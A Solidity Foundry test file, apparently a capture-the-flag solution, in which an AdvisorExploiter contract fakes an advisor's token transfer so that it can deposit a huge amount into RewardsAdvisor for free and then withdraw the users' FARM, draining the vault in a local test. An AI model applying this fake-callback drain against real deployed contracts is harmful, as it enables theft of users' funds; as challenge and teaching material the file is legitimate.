// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import {Utilities} from "../Utilities.sol";
import {Token} from "../../src/Token.sol";
import {IAdvisor, RewardsAdvisor} from "../../src/freebie/RewardsAdvisor.sol";
import {GovToken} from "../../src/freebie/GovToken.sol";

contract AdvisorExploiter is IAdvisor {
    RewardsAdvisor private rewardsAdvisor;

    constructor(RewardsAdvisor _rewardsAdvisor) {
      rewardsAdvisor = _rewardsAdvisor;
    }

    function owner() external returns (address) {
      return address(this);
    }

    function delegatedTransferERC20(address token, address to, uint256 amount) external {
    }

    function run() external {
      uint256 shares = rewardsAdvisor.deposit(1e18 * 1e18, payable(address(this)), address(this));
      rewardsAdvisor.withdraw(shares, msg.sender, payable(address(this)));
    }
}

contract FreebieTest is Test {
  Utilities private utils;

  address payable private attacker;
  address payable private user;

  Token private farm;
  GovToken private gov;
  RewardsAdvisor private rewardsAdvisor;

  function setUp() public {
    utils = new Utilities();

    address payable[] memory users = utils.createUsers(2);
    attacker = users[0];
    user = users[1];
    vm.label(attacker, "Attacker");
    vm.label(user, "User");

    farm = new Token("FARM", "FARM");
    farm.mint(user, 10_000e18);
    farm.mint(attacker, 1e18);

    gov = new GovToken("xFARM", "xFARM");
    rewardsAdvisor = new RewardsAdvisor(address(farm), address(gov));
    gov.transferOwnership(address(rewardsAdvisor));

    vm.startPrank(user);
    farm.approve(address(rewardsAdvisor), type(uint256).max);
    rewardsAdvisor.deposit(10_000e18, user, user);
    vm.stopPrank();
  }

  function testExploit() public {
    // Exploit start
    vm.startPrank(attacker);

    AdvisorExploiter expl = new AdvisorExploiter(rewardsAdvisor);
    vm.label(address(expl), "AdvisorExploiter");
    expl.run();

    vm.stopPrank();
    // Exploit end

    validate();
  }

  function validate() private {
    console2.log("farm.balanceOf(attacker) =", farm.balanceOf(attacker));
    console2.log("farm.balanceOf(address(rewardsAdvisor)) =", farm.balanceOf(address(rewardsAdvisor)));

    assertGe(farm.balanceOf(attacker), 10_000e18);
    assertLe(farm.balanceOf(address(rewardsAdvisor)), 1e18);
  }
}
